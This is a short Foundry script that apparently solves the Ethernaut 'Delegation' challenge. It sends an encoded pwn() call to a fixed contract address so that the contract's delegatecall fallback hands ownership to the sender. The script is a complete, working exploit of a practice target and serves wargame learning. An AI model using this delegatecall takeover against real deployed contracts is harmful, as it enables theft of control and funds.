pragma solidity ^0.6.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract DelegationSolution is Script {

    Delegation public delegationInstance = Delegation(0xC2D4576Ad8b9D1a7f5c353037286bEF02af3689C);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes memory data = abi.encodeWithSignature("pwn()");
        delegationInstance.call(data);
        
        vm.stopBroadcast();
    }
}